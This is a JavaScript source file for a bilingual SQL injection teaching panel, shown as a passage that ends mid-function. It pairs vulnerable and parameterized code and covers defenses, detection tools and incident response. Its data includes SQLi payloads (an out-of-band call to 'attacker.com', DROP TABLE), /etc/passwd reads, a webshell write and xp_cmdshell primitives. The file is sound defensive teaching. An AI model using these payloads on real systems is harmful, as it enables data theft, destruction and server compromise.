/* =========================================================================
   Code Guardian — SQL Injection deep-dive page
   Standalone full-screen reference panel. Vanilla JS + Prism highlighting.
   ========================================================================= */
import { $, $$ } from './dom.js';
import { highlightElement } from './highlight.js';
import { getLang } from '../i18n/index.js';

/* ---------- tiny helpers ---------- */
const esc = (s) =>
  String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

const SVG = {
  close:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  shield:
    '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  copy:
    '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
};

/* ---------- localized micro-strings ---------- */
const TXT = {
  tab: { en: 'SQLi', pl: 'SQLi' },
  open: { en: 'Open SQL Injection deep-dive', pl: 'Otwórz przewodnik SQL Injection' },
  close: { en: 'Close', pl: 'Zamknij' },
  copy: { en: 'Copy', pl: 'Kopiuj' },
  copied: { en: 'Copied', pl: 'Skopiowano' },
  vuln: { en: 'Vulnerable', pl: 'Podatny' },
  safe: { en: 'Secure', pl: 'Bezpieczny' },
};
const tr = (o) => o[getLang()] ?? o.en;

/* =========================================================================
   CONTENT DATA
   ========================================================================= */

const NAV = [
  { id: 'sqli-overview', en: 'Overview', pl: 'Przegląd' },
  { id: 'sqli-types', en: 'Attack types', pl: 'Typy ataków' },
  { id: 'sqli-cheatsheet', en: 'DB cheatsheet', pl: 'Ściąga DB' },
  { id: 'sqli-code', en: 'Vuln vs Secure', pl: 'Podatny vs Bezpieczny' },
  { id: 'sqli-orm', en: 'ORM false safety', pl: 'Fałszywe bezpieczeństwo ORM' },
  { id: 'sqli-method', en: 'Methodology', pl: 'Metodyka' },
  { id: 'sqli-defense', en: 'Defense layers', pl: 'Warstwy obrony' },
  { id: 'sqli-incidents', en: 'Real incidents', pl: 'Incydenty' },
  { id: 'sqli-tools', en: 'SAST / DAST', pl: 'SAST / DAST' },
  { id: 'sqli-compliance', en: 'Compliance', pl: 'Zgodność' },
  { id: 'sqli-ir', en: 'Incident response', pl: 'Reagowanie' },
  { id: 'sqli-migration', en: 'Legacy migration', pl: 'Migracja legacy' },
];

const TYPES = [
  {
    name: 'Union-based',
    sev: 'high',
    desc: { en: 'Appends a UNION SELECT to merge attacker-controlled rows into the result set. Requires matching column count and compatible types.', pl: 'Dokleja UNION SELECT, by wstrzyknąć wiersze atakującego do wyniku. Wymaga zgodnej liczby kolumn i typów.' },
    payload: "' UNION SELECT username, password, NULL FROM users-- -",
  },
  {
    name: 'Boolean blind',
    sev: 'high',
    desc: { en: 'No data returned — the app reveals truth of a condition via page differences. Data is extracted one bit at a time.', pl: 'Brak danych w odpowiedzi — aplikacja zdradza prawdziwość warunku różnicą w odpowiedzi. Dane wyciągane bit po bicie.' },
    payload: "' AND SUBSTRING(password,1,1)='a'-- -",
  },
  {
    name: 'Time-based blind',
    sev: 'high',
    desc: { en: 'No visible difference at all — inference is made from response delays triggered by conditional sleeps.', pl: 'Brak widocznej różnicy — wnioskowanie z opóźnień odpowiedzi wywołanych warunkowym uśpieniem.' },
    payload: "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
  },
  {
    name: 'Error-based',
    sev: 'high',
    desc: { en: 'Forces the database to emit error messages that leak data through verbose diagnostics (e.g. EXTRACTVALUE, CAST).', pl: 'Wymusza komunikaty błędów DB, które wyciekają dane przez szczegółowe diagnostyki (np. EXTRACTVALUE, CAST).' },
    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
  },
  {
    name: 'Second-order (stored)',
    sev: 'critical',
    desc: { en: 'Payload is stored safely on insert, then executed later when re-used in a raw query. Missed by both SAST and DAST.', pl: 'Ładunek zapisywany bezpiecznie, potem wykonywany przy ponownym użyciu w surowym zapytaniu. Pomijany przez SAST i DAST.' },
    payload: "admin'-- -   (stored as username, weaponized on profile update)",
  },
  {
    name: 'Out-of-band (OOB)',
    sev: 'high',
    desc: { en: 'Exfiltrates data over a side channel (DNS/HTTP) when responses are not visible — UTL_HTTP, xp_dirtree, LOAD_FILE.', pl: 'Eksfiltruje dane kanałem bocznym (DNS/HTTP) gdy odpowiedź jest niewidoczna — UTL_HTTP, xp_dirtree, LOAD_FILE.' },
    payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- -",
  },
  {
    name: 'Stacked queries',
    sev: 'critical',
    desc: { en: 'Terminates the original statement and runs a second one — enables INSERT/DROP and command execution where the driver allows it.', pl: 'Kończy oryginalne zapytanie i uruchamia drugie — pozwala na INSERT/DROP i wykonanie poleceń, gdy sterownik na to pozwala.' },
    payload: "'; DROP TABLE audit_log;-- -",
  },
  {
    name: 'ORDER BY injection',
    sev: 'medium',
    desc: { en: 'Sort parameters cannot be parameterized as values — column index/name injected into ORDER BY enables enumeration.', pl: 'Parametry sortowania nie mogą być parametryzowane jako wartości — indeks/nazwa kolumny w ORDER BY pozwala na enumerację.' },
    payload: 'ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)',
  },
  {
    name: 'INSERT / UPDATE / DELETE',
    sev: 'high',
    desc: { en: 'Injection in write statements lets attackers tamper with stored data or subqueries inside VALUES / SET clauses.', pl: 'Wstrzyknięcie w zapytania zapisu pozwala manipulować danymi lub podzapytaniami w VALUES / SET.' },
    payload: "', (SELECT password FROM users WHERE id=1))-- -",
  },
];

const DBS = [
  {
    name: 'MySQL',
    rows: [
      ['Sleep', 'SLEEP(5)'],
      ['Concat', 'GROUP_CONCAT(col SEPARATOR 0x3a)'],
      ['Comment', '-- -  /  #  /  /**/'],
      ['Version', '@@version'],
      ['File read', 'LOAD_FILE(\'/etc/passwd\')'],
      ['File write', 'INTO OUTFILE \'/var/www/sh.php\''],
    ],
  },
  {
    name: 'PostgreSQL',
    rows: [
      ['Sleep', 'pg_sleep(5)'],
      ['Concat', 'string_agg(col, \',\')'],
      ['Comment', '-- -  /  /**/'],
      ['Version', 'version()'],
      ['File read', 'pg_read_file(\'/etc/passwd\')'],
      ['RCE', 'COPY t FROM PROGRAM \'id\''],
    ],
  },
  {
    name: 'MSSQL',
    rows: [
      ['Sleep', "WAITFOR DELAY '0:0:5'"],
      ['Concat', '(SELECT col+\',\' FOR XML PATH(\'\'))'],
      ['Comment', '-- -  /  /**/'],
      ['Version', '@@version'],
      ['RCE', 'EXEC xp_cmdshell \'whoami\''],
      ['OOB', "xp_dirtree '\\\\host\\s'"],
    ],
  },
  {
    name: 'Oracle',
    rows: [
      ['Sleep', 'DBMS_PIPE.RECEIVE_MESSAGE((\'a\'),5)'],
      ['Concat', "LISTAGG(col,',')"],
      ['Comment', '-- -  /  /**/'],
      ['Version', 'SELECT banner FROM v$version'],
      ['Required', 'FROM DUAL (single-row)'],
      ['OOB', 'UTL_HTTP.REQUEST(...)'],
    ],
  },
  {
    name: 'SQLite',
    rows: [
      ['Sleep', '— (no native sleep)'],
      ['Concat', 'group_concat(col, \':\')'],
      ['Comment', '-- -  /  /**/'],
      ['Version', 'sqlite_version()'],
      ['RCE', 'load_extension(\'evil.so\')'],
      ['Attach', 'ATTACH DATABASE \'x.db\' AS x'],
    ],
  },
];

const CODE = {
  Python: {
    lang: 'python',
    vuln: `# VULNERABLE — string interpolation puts user input into the query text
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")`,
    safe: `# SECURE — parameterized query; driver sends data separately from SQL
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))`,
  },
  JavaScript: {
    lang: 'javascript',
    vuln: `// VULNERABLE — template literal concatenates input into the SQL string
const q = \`SELECT * FROM users WHERE email = '\${email}'\`;
db.query(q);`,
    safe: `// SECURE — placeholders; node-postgres / mysql2 bind values
db.query('SELECT * FROM users WHERE email = $1', [email]);
connection.execute('SELECT * FROM users WHERE email = ?', [email]);`,
  },
  PHP: {
    lang: 'php',
    vuln: `<?php // VULNERABLE — input concatenated directly into the query
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $sql);`,
    safe: `<?php // SECURE — PDO prepared statement with bound parameter
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);`,
  },
  Java: {
    lang: 'java',
    vuln: `// VULNERABLE — Statement with concatenated input
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery(
    "SELECT * FROM users WHERE name = '" + name + "'");`,
    safe: `// SECURE — PreparedStatement with bound parameter
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, name);
ResultSet rs = ps.executeQuery();`,
  },
  Go: {
    lang: 'go',
    vuln: `// VULNERABLE — fmt.Sprintf builds the query from user input
q := fmt.Sprintf("SELECT * FROM users WHERE id = %s", id)
rows, _ := db.Query(q)`,
    safe: `// SECURE — placeholder; database/sql binds the argument
rows, err := db.Query("SELECT * FROM users WHERE id = $1", id)`,
  },
};

const ORM = [
  { fw: 'Django', api: '.raw() / .extra()', note: { en: 'Raw SQL bypasses the ORM\'s automatic escaping. Use params= argument.', pl: 'Surowy SQL omija auto-escaping ORM. Użyj argumentu params=.' } },
  { fw: 'SQLAlchemy', api: 'text() / literal_column()', note: { en: 'text() with f-strings is injectable. Bind with :param and .params().', pl: 'text() z f-stringami jest podatny. Wiąż przez :param i .params().' } },
  { fw: 'Hibernate', api: 'createNativeQuery()', note: { en: 'Native queries skip HQL parameter binding. Use setParameter().', pl: 'Zapytania natywne pomijają wiązanie HQL. Użyj setParameter().' } },
  { fw: 'Sequelize', api: 'literal() / { raw: true }', note: { en: 'literal() injects raw SQL fragments. Use replacements / bind.', pl: 'literal() wstrzykuje surowe fragmenty SQL. Użyj replacements / bind.' } },
];

const METHOD = [
  { en: ['Detect', 'Single quote, boolean pairs (1=1 / 1=2), and time delays reveal an injectable parameter.'], pl: ['Wykrycie', 'Apostrof, pary boolowskie (1=1 / 1=2) i opóźnienia czasowe ujawniają podatny parametr.'] },
  { en: ['Fingerprint', 'Error messages, function behavior, and comment syntax identify the DBMS.'], pl: ['Identyfikacja', 'Komunikaty błędów, zachowanie funkcji i składnia komentarzy wskazują DBMS.'] },
  { en: ['Enumerate', 'ORDER BY → column count, UNION NULL technique, then information_schema for the schema.'], pl: ['Enumeracja', 'ORDER BY → liczba kolumn, technika UNION NULL, potem information_schema dla schematu.'] },
  { en: ['Extract', 'Pull credentials, schema, and sensitive data via UNION or blind inference.'], pl: ['Ekstrakcja', 'Wyciągnięcie poświadczeń, schematu i wrażliwych danych przez UNION lub blind.'] },
  { en: ['Escalate', 'File read/write → webshell → RCE via xp_cmdshell / COPY TO PROGRAM.'], pl: ['Eskalacja', 'Odczyt/zapis plików → webshell → RCE przez xp_cmdshell / COPY TO PROGRAM.'] },
];

const DEFENSE = [
  { rank: 1, eff: 100, label: { en: 'Parameterized queries', pl: 'Zapytania parametryzowane' }, kind: 'primary', note: { en: 'Structural fix — separates code from data. The only complete defense.', pl: 'Naprawa strukturalna — oddziela kod od danych. Jedyna pełna obrona.' } },
  { rank: 2, eff: 85, label: { en: 'ORM with safe APIs', pl: 'ORM z bezpiecznym API' }, kind: 'strong', note: { en: 'Default query builders are safe; avoid raw()/text()/native escapes.', pl: 'Domyślne buildery są bezpieczne; unikaj raw()/text()/natywnych.' } },
  { rank: 3, eff: 70, label: { en: 'Allow-list input validation', pl: 'Walidacja wejścia (allow-list)' }, kind: 'strong', note: { en: 'Essential for non-parameterizable parts (ORDER BY, table names).', pl: 'Niezbędna dla niemożliwych do parametryzacji części (ORDER BY, nazwy tabel).' } },
  { rank: 4, eff: 50, label: { en: 'Least-privilege DB account', pl: 'Konto DB o min. uprawnieniach' }, kind: 'mitigation', note: { en: 'Limits blast radius — no FILE, no DDL, no xp_cmdshell.', pl: 'Ogranicza skutki — bez FILE, DDL, xp_cmdshell.' } },
  { rank: 5, eff: 30, label: { en: 'Stored procedures', pl: 'Procedury składowane' }, kind: 'mitigation', note: { en: 'Only safe if they themselves use bound parameters internally.', pl: 'Bezpieczne tylko gdy same używają wiązanych parametrów.' } },
  { rank: 6, eff: 20, label: { en: 'WAF (compensating only)', pl: 'WAF (tylko kompensacyjny)' }, kind: 'weak', note: { en: 'Bypassable via encoding/comments. Never a primary control.', pl: 'Omijalny przez kodowanie/komentarze. Nigdy nie jako główna kontrola.' } },
];

const INCIDENTS = [
  { org: 'Heartland Payment Systems', year: 2008, impact: '134M card records', cost: '$140M', en: 'SQLi gave initial foothold into the payment processor network.', pl: 'SQLi dało pierwszy przyczółek w sieci procesora płatności.' },
  { org: 'Sony PlayStation Network', year: 2011, impact: '77M accounts', cost: 'Plaintext passwords', en: 'Massive breach with credentials stored without proper hashing.', pl: 'Ogromny wyciek z poświadczeniami bez właściwego hashowania.' },
  { org: 'Yahoo Voices', year: 2012, impact: '450K credentials', cost: 'Public dump', en: 'Union-based SQLi dumped plaintext credentials publicly.', pl: 'Union-based SQLi opublikowało poświadczenia w jawnej formie.' },
  { org: 'TalkTalk', year: 2015, impact: '157K customers', cost: '£400K fine', en: 'Basic SQLi exploited by teenagers; record ICO fine at the time.', pl: 'Podstawowy SQLi wykorzystany przez nastolatków; rekordowa kara ICO.' },
];

const TOOLS = {
  sast: [
    ['Semgrep', 'p/sql-injection ruleset, fast CI gate'],
    ['Bandit', 'B608 — hardcoded SQL string building (Python)'],
    ['CodeQL', 'Dataflow taint tracking, multi-language'],
    ['SpotBugs + FindSecBugs', 'JVM bytecode SQLi detectors'],
  ],
  dast: [
    ['SQLmap', 'Automated detection & exploitation, authenticated mode'],
    ['Burp Suite Pro', 'Active scanner + manual repeater/intruder'],
    ['OWASP ZAP', 'Open-source active scan + fuzzing'],
  ],
};

const COMPLIANCE = [
  { std: 'PCI DSS', items: ['6.2.4 — secure coding vs injection', '6.3.2 — review custom code', '11.3 — penetration testing'] },
  { std: 'GDPR', items: ['Art. 25 — security by design', 'Art. 32 — appropriate measures', 'Art. 33/34 — 72h breach notification'] },
  { std: 'SOC 2', items: ['CC6.1 — logical access controls', 'CC7.1 — vulnerability detection'] },
];

const IR = {
  en: [
    'Isolate the affected system / endpoint from the network',
    'Preserve database & application logs (do not wipe)',
    'Rotate database credentials and API keys',
    'Assess scope — which tables / records were accessed',
    'Patch: parameterize the vulnerable query, redeploy',
    'Notify regulators within 72h (GDPR) and affected users',
    'Post-incident: SAST/DAST sweep for sibling vulnerabilities',
  ],
  pl: [
    'Odizoluj dotknięty system / endpoint od sieci',
    'Zabezpiecz logi bazy i aplikacji (nie usuwaj)',
    'Zrotuj poświadczenia DB i klucze API',
    'Oceń zakres — które tabele / rekordy zostały odczytane',
    'Załataj: sparametryzuj podatne zapytanie, wdróż ponownie',
    'Powiadom regulatorów w 72h (GDPR) i dotkniętych użytkowników',
    'Po incydencie: przegląd SAST/DAST pod kątem bliźniaczych podatności',
  ],
};

const MIGRATION = [
  { en: ['1 · Inventory', 'SAST scan (Semgrep / Bandit) to catalogue every raw string-concat SQL statement.'], pl: ['1 · Inwentaryzacja', 'Skan SAST (Semgrep / Bandit), by skatalogować każde surowe zapytanie z konkatenacją.'] },
  { en: ['2 · Parameterize', 'Incremental rewrite, highest-risk endpoints first: login, search, payment.'], pl: ['2 · Parametryzacja', 'Stopniowa przebudowa, najpierw najwyższe ryzyko: login, wyszukiwarka, płatności.'] },
  { en: ['3 · Validate', 'DAST with SQLmap in authenticated mode per endpoint to confirm the fix.'], pl: ['3 · Walidacja', 'DAST z SQLmap w trybie uwierzytelnionym per endpoint, by potwierdzić naprawę.'] },
];

/* =========================================================================
   RENDERING
   ========================================================================= */

function sevClass(s) {
  return { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low' }[s] || 'badge-low';
}

function codeBlock(lang, code) {
  return `<div class="sqli-code-area">
    <button class="sqli-copy" type="button" title="${tr(TXT.copy)}">${SVG.copy}<span>${tr(TXT.copy)}</span></button>
    <pre><code class="language-${lang}">${esc(code)}</code></pre>
  </div>`;
}

function buildNav() {
  const lang = getLang();
  return NAV.map((n, i) =>
    `<a class="sqli-nav-link${i === 0 ? ' active' : ''}" href="#${n.id}" data-target="${n.id}">${n[lang]}</a>`
  ).join('');
}

function buildOverview() {
  const lang = getLang();
  const lead = lang === 'en'
    ? 'SQL Injection lets an attacker alter the structure of a database query by smuggling syntax through unsanitized input — turning a data field into executable SQL. It remains one of the highest-impact web vulnerabilities: a single injectable parameter can expose every record in the database, and in the worst case lead to full remote code execution on the server.'
    : 'SQL Injection pozwala atakującemu zmienić strukturę zapytania do bazy, przemycając składnię przez niesanityzowane wejście — zamieniając pole danych w wykonywalny SQL. To wciąż jedna z najgroźniejszych podatności webowych: pojedynczy podatny parametr może odsłonić każdy rekord w bazie, a w skrajnym przypadku prowadzić do pełnego zdalnego wykonania kodu na serwerze.';

  return `<section id="sqli-overview" class="sqli-section">
    <div class="sqli-hero">
      <span class="sqli-eyebrow">${SVG.shield}<span>Code Guardian · Deep-dive</span></span>
      <h1>SQL <span class="grad">Injection</span></h1>
      <p class="sqli-lead">${lead}</p>
      <div class="sqli-metrics">
        <div class="sqli-metric crit"><div class="sqli-metric-k">CWE-89</div><div class="sqli-metric-v">${lang === 'en' ? 'Weakness ID' : 'ID słabości'}</div></div>
        <div class="sqli-metric crit"><div class="sqli-metric-k">9.8</div><div class="sqli-metric-v">CVSS · Critical</div></div>
        <div class="sqli-metric"><div class="sqli-metric-k">A03:2021</div><div class="sqli-metric-v">OWASP Top 10</div></div>
        <div class="sqli-metric"><div class="sqli-metric-k">9</div><div class="sqli-metric-v">${lang === 'en' ? 'Attack variants' : 'Warianty ataku'}</div></div>
      </div>
      <div class="sqli-sources">
        <span class="sqli-sources-label">${lang === 'en' ? 'Verified sources:' : 'Zweryfikowane źródła:'}</span>
        <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener" class="sqli-source-link">OWASP A03:2021</a>
        <a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener" class="sqli-source-link">CWE-89 (MITRE)</a>
        <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="sqli-source-link">OWASP Prevention Cheat Sheet</a>
        <a href="https://nvd.nist.gov/vuln/search/results?query=sql+injection&search_type=all" target="_blank" rel="noopener" class="sqli-source-link">NIST NVD</a>
        <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener" class="sqli-source-link">PortSwigger Academy</a>
      </div>
    </div>
  </section>`;
}

function buildTypes() {
  const lang = getLang();
  const cards = TYPES.map((t) => `
    <article class="sqli-type-card">
      <header>
        <h3>${esc(t.name)}</h3>
        <span class="badge ${sevClass(t.sev)}">${t.sev}</span>
      </header>
      <p>${t.desc[lang]}</p>
      <div class="sqli-payload"><span class="sqli-payload-tag">payload</span><code>${esc(t.payload)}</code></div>
    </article>`).join('');
  return secWrap('sqli-types', lang === 'en' ? 'Attack types' : 'Typy ataków',
    lang === 'en' ? 'Nine distinct ways the same root cause manifests — from noisy UNION dumps to silent time-based inference.' : 'Dziewięć sposobów, w jakie ta sama przyczyna się ujawnia — od głośnych zrzutów UNION po ciche wnioskowanie czasowe.',
    `<div class="sqli-type-grid">${cards}</div>`);
}

function buildCheatsheet() {
  const lang = getLang();
  const cols = DBS.map((db) => `
    <div class="sqli-db-col">
      <h4>${esc(db.name)}</h4>
      ${db.rows.map((r) => `<div class="sqli-db-row"><span class="sqli-db-key">${esc(r[0])}</span><code>${esc(r[1])}</code></div>`).join('')}
    </div>`).join('');
  return secWrap('sqli-cheatsheet', lang === 'en' ? 'DB-specific cheatsheet' : 'Ściąga per baza',
    lang === 'en' ? 'Fingerprinting and exploitation primitives differ per engine. Confirmed across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.' : 'Prymitywy identyfikacji i eksploatacji różnią się per silnik. Potwierdzone dla MySQL, PostgreSQL, MSSQL, Oracle i SQLite.',
    `<div class="sqli-db-grid">${cols}</div>`);
}

function buildCode() {
  const lang = getLang();
  const langs = Object.keys(CODE);
  const tabs = langs.map((l, i) =>
    `<button class="sqli-lang-tab${i === 0 ? ' active' : ''}" data-lang="${l}" type="button">${l}</button>`).join('');
  const panels = langs.map((l, i) => {
    const c = CODE[l];
    return `<div class="sqli-lang-panel${i === 0 ? ' active' : ''}" data-lang="${l}">
      <div class="sqli-vs">
        <div class="sqli-vs-col vuln"><div class="sqli-vs-head vuln">✗ ${tr(TXT.vuln)}</div>${codeBlock(c.lang, c.vuln)}</div>
        <div class="sqli-vs-col safe"><div class="sqli-vs-head safe">✓ ${tr(TXT.safe)}</div>${codeBlock(c.lang, c.safe)}</div>
      </div>
    </div>`;
  }).join('');
  return secWrap('sqli-code', lang === 'en' ? 'Vulnerable vs Secure' : 'Podatny vs Bezpieczny',
    lang === 'en' ? 'The same fix in five languages: stop building SQL strings, start binding parameters.' : 'Ta sama naprawa w pięciu językach: przestań sklejać stringi SQL, zacznij wiązać parametry.',
    `<div class="sqli-lang-tabs">${tabs}</div><div class="sqli-lang-panels">${panels}</div>`);
}

function buildOrm() {
  const lang = getLang();
  const rows = ORM.map((o) => `
    <div class="sqli-orm-row">
      <div class="sqli-orm-fw">${esc(o.fw)}</div>
      <code class="sqli-orm-api">${esc(o.api)}</code>
      <div class="sqli-orm-note">${o.note[lang]}</div>
    </div>`).join('');
  return secWrap('sqli-orm', lang === 'en' ? 'ORM false safety' : 'Fałszywe bezpieczeństwo ORM',
    lang === 'en' ? 'ORMs are safe by default — until you reach for the raw escape hatch. These APIs bypass automatic parameter binding.' : 'ORM są domyślnie bezpieczne — dopóki nie sięgniesz po surową furtkę. Te API omijają automatyczne wiązanie parametrów.',
    `<div class="sqli-orm">${rows}</div>`);
}

function buildMethod() {
  const lang = getLang();
  const steps = METHOD.map((m, i) => `
    <div class="sqli-step">
      <div class="sqli-step-num">${i + 1}</div>
      <div class="sqli-step-body"><h4>${m[lang][0]}</h4><p>${m[lang][1]}</p></div>
    </div>`).join('');
  return secWrap('sqli-method', lang === 'en' ? 'Attack methodology' : 'Metodyka ataku',
    lang === 'en' ? 'How an attacker progresses from a hunch to full compromise.' : 'Jak atakujący przechodzi od przeczucia do pełnej kompromitacji.',
    `<div class="sqli-timeline">${steps}</div>`);
}

function buildDefense() {
  const lang = getLang();
  const rows = DEFENSE.map((d) => `
    <div class="sqli-def-row ${d.kind}">
      <div class="sqli-def-rank">#${d.rank}</div>
      <div class="sqli-def-main">
        <div class="sqli-def-label">${d.label[lang]}</div>
        <div class="sqli-def-note">${d.note[lang]}</div>
      </div>
      <div class="sqli-def-bar"><span style="width:${d.eff}%"></span></div>
    </div>`).join('');
  return secWrap('sqli-defense', lang === 'en' ? 'Defense layers, ranked' : 'Warstwy obrony wg skuteczności',
    lang === 'en' ? 'Defense in depth — but not all layers are equal. Parameterization is the fix; everything else reduces blast radius.' : 'Obrona w głąb — ale warstwy nie są równe. Parametryzacja to naprawa; reszta ogranicza skutki.',
    `<div class="sqli-defense">${rows}</div>`);
}

function buildIncidents() {
  const lang = getLang();
  const cards = INCIDENTS.map((i) => `
    <article class="sqli-incident">
      <div class="sqli-incident-top"><h4>${esc(i.org)}</h4><span class="sqli-incident-year">${i.year}</span></div>
      <div class="sqli-incident-nums"><span class="sqli-incident-impact">${esc(i.impact)}</span><span class="sqli-incident-cost">${esc(i.cost)}</span></div>
      <p>${i[lang]}</p>
    </article>`).join('');
  const sources = `<div class="sqli-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://www.justice.gov/usao-nj/pr/payment-processor-hacker-sentenced-20-years-prison" target="_blank" rel="noopener">Heartland (DOJ)</a>
    <a href="https://www.ftc.gov/news-events/news/press-releases/2014/08/ftc-files-complaint-against-wyndham-hotels" target="_blank" rel="noopener">FTC enforcement</a>
    <a href="https://ico.org.uk/about-the-ico/media-centre/news-and-blogs/2016/10/talktalk-gets-record-400-000-fine-for-failing-to-prevent-october-2015-attack/" target="_blank" rel="noopener">TalkTalk (ICO)</a>
    <a href="https://www.ftc.gov/news-events/news/press-releases/2011/04/ftc-charges-deceptive-privacy-practices-googles-rollout-buzz" target="_blank" rel="noopener"></a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3414" target="_blank" rel="noopener">Yahoo CVE-2012</a>
  </div>`;
  return secWrap('sqli-incidents', lang === 'en' ? 'Real-world incidents' : 'Rzeczywiste incydenty',
    lang === 'en' ? 'SQLi is not theoretical — these breaches cost hundreds of millions and exposed billions of records.' : 'SQLi nie jest teoretyczne — te wycieki kosztowały setki milionów i odsłoniły miliardy rekordów.',
    `<div class="sqli-incidents">${cards}</div>${sources}`);
}

function buildTools() {
  const lang = getLang();
  const sast = TOOLS.sast.map((t) => `<div class="sqli-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const dast = TOOLS.dast.map((t) => `<div class="sqli-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const note = lang === 'en'
    ? '<strong>Blind spot:</strong> second-order (stored) SQLi is missed by both SAST and DAST — it requires manual code review of where stored values are later re-used in queries.'
    : '<strong>Martwy punkt:</strong> second-order (stored) SQLi jest pomijany przez SAST i DAST — wymaga ręcznego przeglądu kodu tam, gdzie zapisane wartości są później użyte w zapytaniach.';
  return secWrap('sqli-tools', lang === 'en' ? 'Detection tooling' : 'Narzędzia wykrywania',
    lang === 'en' ? 'Static analysis catches concatenation patterns; dynamic analysis confirms exploitability. Use both.' : 'Analiza statyczna łapie konkatenację; dynamiczna potwierdza eksploatowalność. Używaj obu.',
    `<div class="sqli-tools-grid">
      <div class="sqli-tool-col"><h4>SAST · ${lang === 'en' ? 'Static' : 'Statyczna'}</h4>${sast}</div>
      <div class="sqli-tool-col"><h4>DAST · ${lang === 'en' ? 'Dynamic' : 'Dynamiczna'}</h4>${dast}</div>
    </div>
    <div class="sqli-callout warn">${note}</div>`);
}

function buildCompliance() {
  const lang = getLang();
  const cards = COMPLIANCE.map((c) => `
    <article class="sqli-comp-card">
      <h4>${esc(c.std)}</h4>
      <ul>${c.items.map((i) => `<li>${esc(i)}</li>`).join('')}</ul>
    </article>`).join('');
  const sources = `<div class="sqli-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://www.pcisecuritystandards.org/document_library/" target="_blank" rel="noopener">PCI DSS v4.0</a>
    <a href="https://gdpr-info.eu/art-32-gdpr/" target="_blank" rel="noopener">GDPR Art. 32</a>
    <a href="https://gdpr-info.eu/art-33-gdpr/" target="_blank" rel="noopener">GDPR Art. 33</a>
    <a href="https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security" target="_blank" rel="noopener">SOC 2 (AICPA)</a>
  </div>`;
  return secWrap('sqli-compliance', lang === 'en' ? 'Compliance quick-reference' : 'Szybka zgodność',
    lang === 'en' ? 'Where SQLi prevention maps onto the controls auditors check.' : 'Gdzie zapobieganie SQLi mapuje się na kontrole sprawdzane przez audytorów.',
    `<div class="sqli-comp-grid">${cards}</div>${sources}`);
}

function buildIR() {
  const lang = getLang();
  const items = IR[lang].map((s, i) => `
    <li class="sqli-ir-item"><span class="sqli-ir-check">${i + 1}</span><span>${esc(s)}</span></li>`).join('');
  return secWrap('sqli-ir', lang === 'en' ? 'Incident response checklist' : 'Lista kontrolna reagowania',
    lang === 'en' ? 'If you confirm an active SQLi breach, work this list top to bottom.' : 'Po potwierdzeniu aktywnego wycieku SQLi przejdź tę listę od góry.',
    `<ol class="sqli-ir">${items}</ol>`);
}

function buildMigration() {
  const lang = getLang();
  const steps = MIGRATION.map((m) => `
    <div class="sqli-mig-card">
      <h4>${m[lang][0]}</h4>
      <p>${m[lang][1]}</p>
    </div>`).join('');
  return secWrap('sqli-migration', lang === 'en' ? 'Legacy migration strategy' : 'Strategia migracji legacy',
    lang === 'en' ? 'Three phases to retire string-concatenation SQL from an existing codebase without a big-bang rewrite.' : 'Trzy fazy, by wycofać SQL z konkatenacji bez ryzykownego przepisania na raz.',
    `<div class="sqli-mig">${steps}</div>`);
}

function secWrap(id, title, lead, inner) {
  return `<section id="${id}" class="sqli-section">
    <h2 class="sqli-h2">${title}</h2>
    <p class="sqli-section-lead">${lead}</p>
    ${inner}
  </section>`;
}

function buildContent() {
  return [
    buildOverview(),
    buildTypes(),
    buildCheatsheet(),
    buildCode(),
    buildOrm(),
    buildMethod(),
    buildDefense(),
    buildIncidents(),
    buildTools(),
    buildCompliance(),
    buildIR(),
    buildMigration(),
    `<footer class="sqli-footer">Code Guardian — SQL Injection deep-dive · ${getLang() === 'en' ? 'All "VULNERABLE" examples are illustrative only — do not use in production.' : 'Wszystkie przykłady "PODATNY" są wyłącznie poglądowe — nie używaj na produkcji.'}</footer>`,
  ].join('');
}

/* =========================================================================
   WIRING
   ========================================================================= */

let highlighted = false;

function highlightOnce(panel) {
  if (highlighted) return;
  $$('code[class*="language-"]', panel).forEach((c) => highlightElement(c));
